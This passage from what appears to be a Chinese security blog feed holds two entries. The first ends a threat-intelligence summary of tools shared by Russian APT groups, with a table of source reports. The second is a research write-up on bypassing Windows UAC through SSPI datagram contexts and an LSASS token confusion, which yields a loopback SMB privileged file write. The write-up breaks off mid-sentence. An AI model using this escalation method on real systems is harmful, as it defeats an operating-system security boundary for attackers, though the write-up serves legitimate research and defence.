是使用不同工具总数最多的俄罗斯威胁组。</li><li><strong>工具依赖性</strong>：记录显示，俄罗斯威胁组织对攻击性安全工具的严重依赖，累计使用多达 27 种不同的工具。</li><li><strong>共同使用的工具</strong>：<ul><li><strong>Mimikatz</strong>：被 COZY BEAR、FANCY BEAR、BERSERK BEAR、GAMAREDON 和 Turla 使用。</li><li><strong>Impacket</strong>：被 COZY BEAR、FANCY BEAR、EMBER BEAR、Sandworm 和 BERSERK BEAR 使用。</li><li><strong>PsExec</strong>：被 COZY BEAR、EMBER BEAR、BERSERK BEAR、GAMAREDON 和 Turla 使用。</li><li><strong>Metasploit</strong>：被 FANCY BEAR、EMBER BEAR、Sandworm 和 Turla 使用。</li><li><strong>ReGeorg</strong>：被 COZY BEAR、FANCY BEAR、EMBER BEAR 和 Sandworm 使用。</li></ul></li><li><strong>入侵识别</strong>：如果在一次入侵中观察到上述工具的组合，这可能表明该入侵是由俄罗斯国家支持的威胁组织进行的，并且可能与勒索活动有关。</li></ol><p>这些观察为我们理解俄罗斯威胁组织的战术和工具选择提供了宝贵的洞见，有助于更好地防范潜在的网络威胁。</p><h1 id="报告来源"><a href="#报告来源" class="headerlink" title="报告来源"></a>报告来源</h1><table><thead><tr><th>Date Published</th><th>Russian APT</th><th>Report</th></tr></thead><tbody><tr><td>26 September 2024</td><td>Gamaredon</td><td><a href="https://www.welivesecurity.com/en/eset-research/cyberespionage-gamaredon-way-analysis-toolset-used-spy-ukraine-2022-2023">https://www.welivesecurity.com/en/eset-research/cyberespionage-gamaredon-way-analysis-toolset-used-spy-ukraine-2022-2023</a></td></tr><tr><td>5 September 2024</td><td>EMBER BEAR</td><td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a">https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a</a></td></tr><tr><td>14 August 2024</td><td>Star Blizzard</td><td><a href="https://citizenlab.ca/2024/08/sophisticated-phishing-targets-russias-perceived-enemies-around-the-globe/">https://citizenlab.ca/2024/08/sophisticated-phishing-targets-russias-perceived-enemies-around-the-globe/</a></td></tr><tr><td>19 June 2024</td><td>COZY BEAR</td><td><a href="https://www.cert.ssi.gouv.fr/cti/CERTFR-2024-CTI-006/">https://www.cert.ssi.gouv.fr/cti/CERTFR-2024-CTI-006/</a></td></tr><tr><td>5 June 2024</td><td>UAC-0020</td><td><a href="https://cert.gov.ua/article/6279600">https://cert.gov.ua/article/6279600</a></td></tr><tr><td>1 May 2024</td><td>FANCY BEAR</td><td><a href="https://www.trendmicro.com/en_us/research/24/e/router-roulette.html">https://www.trendmicro.com/en_us/research/24/e/router-roulette.html</a></td></tr><tr><td>19 April 2024</td><td>Sandworm</td><td><a href="https://cert.gov.ua/article/6278706">https://cert.gov.ua/article/6278706</a></td></tr><tr><td>17 April 2024</td><td>Sandworm</td><td><a href="https://services.google.com/fh/files/misc/apt44-unearthing-sandworm.pdf">https://services.google.com/fh/files/misc/apt44-unearthing-sandworm.pdf</a></td></tr><tr><td>21 March 2024</td><td>Turla</td><td><a href="https://blog.talosintelligence.com/tinyturla-full-kill-chain/">https://blog.talosintelligence.com/tinyturla-full-kill-chain/</a></td></tr><tr><td>22 January 2024</td><td>UAC-0050</td><td><a href="https://cert.gov.ua/article/6277285">https://cert.gov.ua/article/6277285</a></td></tr><tr><td>28 December 2023</td><td>FANCY BEAR</td><td><a href="https://cert.gov.ua/article/6276894">https://cert.gov.ua/article/6276894</a></td></tr><tr><td>13 December 2023</td><td>COZY BEAR</td><td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a">https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a</a></td></tr><tr><td>8 December 2023</td><td>FANCY BEAR</td><td><a href="https://securityintelligence.com/x-force/itg05-ops-leverage-israel-hamas-conflict-lures-to-deliver-headlace-malware/">https://securityintelligence.com/x-force/itg05-ops-leverage-israel-hamas-conflict-lures-to-deliver-headlace-malware/</a></td></tr><tr><td>27 January 2023</td><td>COZY BEAR</td><td><a href="https://go.recordedfuture.com/hubfs/reports/cta-2023-0127.pdf">https://go.recordedfuture.com/hubfs/reports/cta-2023-0127.pdf</a></td></tr><tr><td>2 May 2022</td><td>COZY BEAR</td><td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3524-eye-spy-email/">https://cloud.google.com/blog/topics/threat-intelligence/unc3524-eye-spy-email/</a></td></tr><tr><td>27 January 2022</td><td>COZY BEAR</td><td><a href="https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/">https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/</a></td></tr><tr><td>4 November 2021</td><td>Gamaredon</td><td>[<a href="https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf]">https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf]</a>(<a href="https://ssu.gov.ua/uploads/files/DKIB/Technical">https://ssu.gov.ua/uploads/files/DKIB/Technical</a> report Armagedon.pdf)</td></tr><tr><td>25 October 2021</td><td>COZY BEAR</td><td><a href="https://www.microsoft.com/en-us/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/">https://www.microsoft.com/en-us/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/</a></td></tr><tr><td>1 July 2021</td><td>FANCY BEAR</td><td><a href="https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF">https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF</a></td></tr><tr><td>27 May 2021</td><td>COZY BEAR</td><td><a href="https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/">https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/</a></td></tr><tr><td>18 December 2020</td><td>COZY BEAR</td><td><a href="https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/">https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/</a></td></tr><tr><td>2 December 2020</td><td>Turla</td><td><a href="https://www.welivesecurity.com/2020/12/02/turla-crutch-keeping-back-door-open/">https://www.welivesecurity.com/2020/12/02/turla-crutch-keeping-back-door-open/</a></td></tr><tr><td>10 September 2020</td><td>FANCY BEAR</td><td><a href="https://www.microsoft.com/en-us/security/blog/2020/09/10/strontium-detecting-new-patters-credential-harvesting/">https://www.microsoft.com/en-us/security/blog/2020/09/10/strontium-detecting-new-patters-credential-harvesting/</a></td></tr><tr><td>15 June 2020</td><td>Turla</td><td><a href="https://web-assets.esetstatic.com/wls/2020/05/ESET_Turla_ComRAT.pdf">https://web-assets.esetstatic.com/wls/2020/05/ESET_Turla_ComRAT.pdf</a></td></tr><tr><td>24 July 2019</td><td>BERSERK BEAR</td><td><a href="https://www.secureworks.com/research/resurgent-iron-liberty-targeting-energy-sector">https://www.secureworks.com/research/resurgent-iron-liberty-targeting-energy-sector</a></td></tr><tr><td>20 June 2019</td><td>Turla</td><td><a href="https://symantec-enterprise-blogs.security.com/threat-intelligence/waterbug-espionage-governments">https://symantec-enterprise-blogs.security.com/threat-intelligence/waterbug-espionage-governments</a></td></tr><tr><td>17 August 2018</td><td>Turla</td><td><a href="https://web-assets.esetstatic.com/wls/2018/08/Eset-Turla-Outlook-Backdoor.pdf">https://web-assets.esetstatic.com/wls/2018/08/Eset-Turla-Outlook-Backdoor.pdf</a></td></tr><tr><td>6 June 2018</td><td>FANCY BEAR</td><td><a href="https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/">https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/</a></td></tr><tr><td>22 May 2018</td><td><a href="https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/">https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/</a></td><td></td></tr><tr><td>18 April 2018</td><td>FANCY BEAR</td><td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-108">https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-108</a></td></tr><tr><td>16 March 2018</td><td>BERSERK BEAR</td><td><a href="https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors">https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors</a></td></tr><tr><td>20 October 2017</td><td>BERSERK BEAR</td><td><a href="https://symantec-enterprise-blogs.security.com/threat-intelligence/dragonfly-energy-sector-cyber-attacks">https://symantec-enterprise-blogs.security.com/threat-intelligence/dragonfly-energy-sector-cyber-attacks</a></td></tr><tr><td>11 August 2017</td><td>FANCY BEAR</td><td><a href="https://web.archive.org/web/20170811181009/https://www.fireeye.com/blog/threat-research/2017/08/apt28-targets-hospitality-sector.html">https://web.archive.org/web/20170811181009/https://www.fireeye.com/blog/threat-research/2017/08/apt28-targets-hospitality-sector.html</a></td></tr><tr><td>4 December 2015</td><td>FANCY BEAR</td><td><a href="https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/">https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/</a></td></tr><tr><td>18 April 2015</td><td>FANCY BEAR</td><td><a href="https://cloud.google.com/blog/topics/threat-intelligence/probable-apt28-useo/">https://cloud.google.com/blog/topics/threat-intelligence/probable-apt28-useo/</a></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>APT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
      <tag>RussiaAPT</tag>
      
      <tag>CTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用 SSPI 数据报上下文绕过 UAC</title>
    <link href="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/"/>
    <url>/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/</url>
    
    <content type="html"><![CDATA[<h2 id="UAC：用户账户控制（以前称为-LUA-受限用户账户）"><a href="#UAC：用户账户控制（以前称为-LUA-受限用户账户）" class="headerlink" title="UAC：用户账户控制（以前称为 LUA - 受限用户账户）"></a>UAC：用户账户控制（以前称为 LUA - 受限用户账户）</h2><p>简单提供一些背景知识，<a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/">UAC（用户账户控制）</a>是 Windows 中的一种提权机制，当某个操作需要管理权限时，它会触发一个同意提示。这个同意提示旨在通过要求管理员批准来强制实行<strong>权限分离</strong>。虽然它为防止未经授权的操作系统更改增加一层安全保障，但事实证明它的设计充满了漏洞。有很多已知的方法可以绕过 UAC，并在没有用户交互提供的任何提示或同意的情况下以提升的权限执行操作。你可以参考<a href="https://github.com/hfiref0x/UACME">UACMe</a>，以获取已知 UAC 绕过方法（已修复和未修复的🙈）的整理列表和相关源代码。</p><p>我打赌你在某个时候遇到过这个屏幕。是的，这就是 UAC 同意提示：</p>  <img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/uac_prompt.png" class=""><p>如果对 UAC 的内部工作原理感兴趣，已经有很多关于它的研究。在参考部分可以找到一些全面的演讲和博客文章。</p><h2 id="NTLM-身份验证中的一个有趣行为"><a href="#NTLM-身份验证中的一个有趣行为" class="headerlink" title="NTLM 身份验证中的一个有趣行为"></a>NTLM 身份验证中的一个有趣行为</h2><p>在 Windows 中存在“type your password once and authenticate everywhere”的奇妙概念。这与任何单点登录系统的基本概念相同，但直接集成到操作系统中。为了实现这一点，必须有人存储你的密码，这就是<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication"><strong>LSA</strong></a>发挥作用的地方。它为系统上发生的任何相关身份验证提供了支撑。需要知道的是，LSA（在<strong>lsass.exe</strong>中实现）通过使用存储在注册表中的配置信息加载<strong>身份验证包</strong>DLL。加载多个身份验证包允许 LSA 支持多种安全协议，例如<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">NTLM</a>、<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/kerberos-ssp-ap">Kerberos</a>等等。</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/lsass-windows-10-folder-5c6d8ddfc9e77c00018ccae0.webp" class="" title="Lsass.exe Windows 10 文件夹位置"><p>当你交互式登录时，LSA 会创建一个新的<strong>登录会话</strong>，将其与你的凭据相关联，并为你的进程创建一个<strong>令牌</strong>，该令牌引用这个新创建的登录会话。这样，当你的进程尝试访问远程资源，比如<code>\\\\SHARE-SERVER\\share1\\file.txt</code> 时，你的进程可以调用<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/authentication-functions#context-management">SSPI 函数</a>来检索<strong>安全缓冲区</strong>以便通过网络发送，并且身份验证从应用程序逻辑中抽象出来，无需提供显式凭据。实际发生的情况是，当你的应用程序调用 SSPI 函数时，它与 lsass.exe 进行通信，lsass.exe 反过来会检查你的进程（如果正在模拟，则检查线程）令牌，并能够关联你的正确<strong>凭据</strong>并派生你的进程可用于身份验证的适当身份验证缓冲区。这是一个过于简化的解释，但希望读者能明白要点。具体的可以参考微软的<a href="https://learn.microsoft.com/zh-cn/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">介绍</a>：</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/authn_lsa_architecture_client.png" class="" title="示意图显示对用户或进程进行身份验证以实现成功登录时所需的组件以及凭据通过系统的路径。"><p>当<strong>网络身份验证</strong>发生时，UAC 限制不会影响生成的令牌。但是有两个例外情况：</p><ul><li>如果你使用<strong>共享的本地管理员</strong>帐户（内置管理员帐户除外）对远程机器进行身份验证；</li><li>如果你在不使用 SPPI 的情况下进行<strong>回环(loopback) 身份验证</strong>并使用本地管理员用户。你需要知道用户的密码或至少是用户的哈希值。</li></ul><p>​只有在这些情况下，<a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction#how-uac-remote-restrictions-work">UAC 远程限制</a>才会生效。如果将 LocalAccountTokenFilterPolicy 设置为 0（这是默认配置），这些限制也将限制服务器端由网络身份验证生成的令牌。相反，如果你使用一个同时也是机器管理员的域用户，UAC 就不会成为障碍：</p><p>可以参考<a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction#how-uac-remote-restrictions-work">UAC 对域用户的远程限制</a>。</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/uac_remote_restrictions.png" class=""><p>​阻止任何人通过 SSPI 在本地绕过 UAC 的主要机制是本地身份验证(<strong>Local Authentication</strong>)。为了理解它，让我们从等式中去掉使用 Kerberos 的本地身份验证，专注于<strong>NTLM</strong>。（注意：<a href="https://twitter.com/tiraniddo">James Forshaw</a>已经在这篇<a href="https://www.tiraniddo.dev/2022/03/bypassing-uac-in-most-complex-way.html">博客文章</a>中展示了如何在本地绕过 Kerberos 上的 UAC 限制。）</p><p>如果你熟悉 NTLM 身份验证，你可以通过观察消息交换中的下面细节来识别<a href="https://davenport.sourceforge.net/ntlm.html#localAuthentication">本地身份验证</a>：</p><ul><li>服务器在挑战消息（类型 2）中设置“<strong>协商本地调用</strong>”标志，NTLM_NEGOTIATE、Negotiate Local Call；</li><li>挑战消息中的“<strong>保留</strong>”字段不为 0，并包含一个引用服务器上下文句柄的数字；</li><li>客户端生成的身份验证消息（类型 3）包含<strong>空</strong>安全缓冲区；</li></ul><p>当这种情况发生时，LSASS 能够将调用进程的<strong>实际令牌</strong>与服务器应用程序的安全上下文相关联。结果，客户端上的任何 UAC 限制对服务器应用程序都变得可见。</p><p>让我们看看在通过 SSPI 进行本地与远程 NTLM 身份验证时令牌的差异：</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/local_vs_remote_auth_token.png" class="" title="img"><p><a href="https://systeminformer.sourceforge.io/">System Informer</a>中本地身份验证（左）与远程身份验证（右）的令牌视图。本地身份验证返回的令牌具有 UAC 限制，实际上你可以看到<strong>IL 级别</strong>是<strong>中等</strong>，并且<strong>管理员</strong>SID 是<strong>禁用</strong>的。相反，远程身份验证在没有 UAC 限制的情况下进行，生成的提升令牌设置为<strong>高 IL</strong>。这里一个重要的区别是令牌中存在的<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/well-known-sids">登录类型 SID</a>，在经过筛选的令牌中有 INTERACTIVE SID，而在提升的令牌中有 NETWORK SID。</p><p><strong>所以问题是：我们能否通过 SSPI 在本地用 NTLM 伪造网络身份验证？</strong></p><h2 id="意外的位标志"><a href="#意外的位标志" class="headerlink" title="意外的位标志"></a>意外的位标志</h2><p>如果我们想在本地身份验证期间欺骗 LSASS，首先我们需要了解这个结果在代码中何时以及如何做出。逆向<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">msv1_0.dll</a>并搜索设置标志 0x4000（NTLMSSP_NEGOTIATE_LOCAL_CALL）的函数：</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/ntlm_reversed_code_1.png" class="" title="img"><p>毫无意外，我们找到了函数 SsprHandleNegotiateMessage。这个函数的作用是处理客户端收到的协商消息并生成适当的挑战。从代码的角度来看，我们在服务器对<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/acceptsecuritycontext--ntlm">AcceptSecurityContext</a>的第一次调用中到达这里。</p><p>这个代码用于检测本地身份验证的逻辑非常直接：如果客户端在<strong>协商</strong>消息中提供的域名和机器名与本地机器名和域名匹配，那么这就是一个本地身份验证的情况。</p><p>但是我们如何进入代码的这一部分呢？让我们交叉引用上面的那个 if 分支：</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/ntlm_reversed_code_2.png" class="" title="img"><p>所以这个函数正在检查客户端提供的协商标志，特别是检查 <strong>NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED</strong> 和 <strong>NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED</strong> 是否设置，如果你在最新的 Windows 版本中使用 SSPI，这总是为真。</p><p>然而，另一个被检查的标志 NTLMSSP_NEGOTIATE_DATAGRAM 到底是什么呢？在网上搜索让我找到了<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/datagram-contexts">数据报上下文</a>。<br>我仍然不明白这个功能的预期行为用途是什么，但我只需要知道我可以通过在第一次<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/initializesecuritycontext--ntlm">InitializeSecurityContext</a>客户端调用中使用标志 ISC_REQ_DATAGRAM 从客户端设置这个“模式”。希望通过这样做，我能够强制实现我所期望的网络身份验证。</p><p>唯一需要考虑的是，该模式使用<strong>无连接上下文语义</strong>（<strong>connection-less context semantics</strong>），并且与外部服务同步可能会有问题。但是对于我们的情况，我们可以在<strong>同一进程</strong>中运行服务器和客户端。即使这听起来很奇怪，但这正是我们需要的最终我们只需要<strong>欺骗</strong>LSASS 为我们<strong>伪造</strong>令牌。</p><p>让我们整理所有的代码，并检查在使用<strong>数据报上下文</strong>时生成的安全缓冲区的样子：</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/datagram_ntlm_packets.png" class="" title="img"><p>观察交换的安全缓冲区，我们可以看到“协商本地标志”（“<strong>Negotiate Local Flag</strong>” ）未设置，并且“<strong>Reserved</strong>”字节为 0，因此服务器没有传递上下文句柄。此外，客户端还在身份验证消息中发送了 NTLMv2 响应。它看起来绝对像是客户端和服务器没有在协商本地身份验证。<br>请注意，在<a href="https://davenport.sourceforge.net/ntlm.html#datagramAuthentication">数据报样式身份验证</a>中生成的协商消息（类型 1）是空的，这与“正常”的面向连接的身份验证相比是一个重要的区别。</p><p>让我们检查这个身份验证生成的令牌，特别是它是否包含神奇的 NETWORK SID 登录类型：</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/network_token_datagram.png" class="" title="img"><p>好消息是，NETWORK SID 已经添加到我们的令牌中，所以任务完成。</p><p>但是，令牌被 UAC 过滤了。如图所示，令牌的 IL 是中等，甚至不是提升的。我认为本地身份验证是过滤令牌的唯一机制的假设是错误的。可能，LSASS 还有其他检查措施，暂时先放放。</p><h2 id="共享登录会话"><a href="#共享登录会话" class="headerlink" title="共享登录会话"></a>共享登录会话</h2><p>我看到了<a href="https://twitter.com/tiraniddo">James Forshaw</a>的博客文章“<a href="https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html">共享登录会话有点过头了</a>”，它启发了我一条<strong>不同的利用路径</strong>。</p><p>从他的博客文章中突出的是，当你进行<strong>回环网络身份验证</strong>时，你可以利用<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general">AcquireCredentialsHandle</a>在网络重定向器中的行为，这将导致 LSASS 使用登录会话中创建的第一个令牌，而不是调用者的令牌。</p><p>当我们完成<strong>数据报样式身份验证</strong>时，LSASS 会创建一个新的登录会话并创建提升的令牌。然后，从提升的令牌开始，它将创建一个新的<strong>经过筛选的</strong>令牌（LUA 令牌），并且这两个令牌是<a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_linked_token">链接</a>的。LUA 令牌是实际与“发送”给服务器的安全上下文相关联的那个令牌。</p><p>LUA 令牌与提升令牌的属性差异。</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/lua_vs_elevated_token.png" class="" title="img"><p>以这种方式生成的令牌中，登录会话 ID（或从令牌的角度来看是身份验证 ID）是相等的，并且令牌 ID 值表明提升令牌是先创建的，并且很可能是该登录会话中创建的第一个令牌。所以根据 LSASS 中的这个“令牌混淆”错误，服务器会将我们的调用视为它是<strong>源自</strong>我们的<strong>提升</strong>令牌，而不是我们模拟的受限令牌。</p><p>为了利用这个错误，我们首先需要检查我们是否能够模拟生成的 LUA 令牌。<br>根据<a href="https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser">ImpersonateLoggedOnUser</a>函数的 Microsoft 文档，只要“已认证的身份与调用者相同”，我们就应该能够模拟一个令牌，这在我们的情况下是成立的。然而，这并不完全正确。在内核函数 SeTokenCanImpersonate 中还有更多的条件在进行检查：</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/setokencanimpersonate.png" class="" title="img"><p>比较令牌属性与我们在 UAC 限制下运行的进程的令牌，所有条件似乎都满足了。所以让我们模拟来自数据报样式身份验证的令牌，并尝试通过<strong>回环接口</strong>写入一个命名管道，例如<code>\\\\127.0.0.1\\pipe\\dummypipe</code>。</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/pipe_client_vs_server_token.png" class="" title="img"><p>​管道客户端线程与管道服务器线程的令牌。</p><p>可以发现即使我们正在模拟<strong>经过筛选的令牌</strong>，我们也能够使用我们的<strong>提升</strong>令牌通过回环接口进行<strong>身份验证</strong>！🎉</p><p>当然，管道服务器是以提升的权限运行的，否则高 IL 令牌将被降级为标识令牌。<br>但是，对于使用这个令牌对已经在运行的特权服务进行身份验证呢？比如通过 SMB 的文件共享服务？这应该就像使用<strong>UNC 路径</strong>调用<a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew">CreateFile</a>一样简单，比如<code>\\\\127.0.0.1\\C$\\Windows\\bypassuac.txt</code>。</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/privileged_file_write.png" class="" title="img"><p>在这一点上，我们有了一个<strong>特权文件写入</strong>原语，它可以与任何已知的 DLL 劫持技术结合使用以实现 EoP，例如使用<a href="https://decoder.cloud/2019/11/13/from-arbitrary-file-overwrite-to-system/">XPS 打印作业</a>或<a href="https://itm4n.github.io/windows-server-netman-dll-hijacking/">NetMan DLL 劫持</a>。</p><h2 id="特权文件写入很好，但代码执行更好-D"><a href="#特权文件写入很好，但代码执行更好-D" class="headerlink" title="特权文件写入很好，但代码执行更好 :D"></a>特权文件写入很好，但代码执行更好 :D</h2><p>如果你还记得，我之前向你展示过我能够使用<strong>提升</strong>令牌甚至对<strong>命名管道</strong>进行身份验证。<br>对命名管道具有特权访问意味着我们可以访问所有使用<a href="https://learn.microsoft.com/en-us/windows/win32/midl/ncacn-np">ncacn_np</a>配置运行的 RPC 服务器，有很多！<br>那么，为什么我们不利用这个错误&#x2F;功能来实现<strong>代码执行</strong>，而不是我们目前的特权文件写入呢？我们有很多诱人的候选者，如<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f">远程 SCM</a>、<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78">远程注册表</a>、<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931">远程任务计划程序</a>等等。</p><p>然而，如果我们尝试通过<a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regconnectregistryw">RegConnectRegistryW</a>调用对<strong>远程注册表</strong>进行身份验证，它将<strong>无法</strong>打开对特权注册表项的句柄。<br>让我们检查一下行为：</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/windbg_details_2.png" class="" title="img"><p>​WinDbg 中 RegConnectRegistryW 调用的 AcquireCredentialsHandle 详细信息。</p><p>结果是，RPC 运行时库（RPCRT4.dll）使用它自己的实现进行身份验证。正如我们所看到的，<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general">AcquireCredentialsHandleW</a>的 pvLogonId 参数被设置为 0，这不会触发 LSASS 中的错误，并且会使用<strong>适当的受限令牌</strong>进行身份验证。</p><p>现在让我们看看使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew">CreateFileW</a>函数对回环接口进行身份验证时的区别：</p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/windbg_mrxsmb20_acquirecredhandle.png" class="" title="img"><p>​WinDbg 中 CreateFileW 调用的 AcquireCredentialsHandle 详细信息。</p><p>我们在这里看到的第一个区别是，身份验证是由 SMB 重定向器驱动程序<strong>mrxsmb20.sys</strong>在<strong>内核</strong>中实现的。</p><p>更重要的是，<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general">AcquireCredentialsHandleW</a>的 pvLogonId 参数被设置为与我们的用户相关联的<strong>登录会话</strong>，这将欺骗 LSASS 使用来自该登录会话的<strong>提升令牌</strong>。<br>根据文档，为了指定 pvLogonId，你需要具有<strong>SeTcbPrivilege</strong>，在这种情况下这不是问题，因为代码是以<strong>内核权限</strong>运行的。</p><p>这意味着如果我们想利用这个错误，就不能使用<strong>RPC 运行时库</strong>对与 RPC 服务相关联的命名管道进行身份验证。<br>然而，没有人能阻止我们使用我们自己的<strong>自定义 RPC 客户端</strong>实现，该实现利用<strong>CreateFileW</strong>调用通过 SMB 对 RPC 服务进行身份验证。但这需要一些艰苦的工作，我太懒了，不想这么做。但这次运气似乎转向了我这边，我发现<a href="https://twitter.com/x86matthew">@x86matthew</a>已经在<a 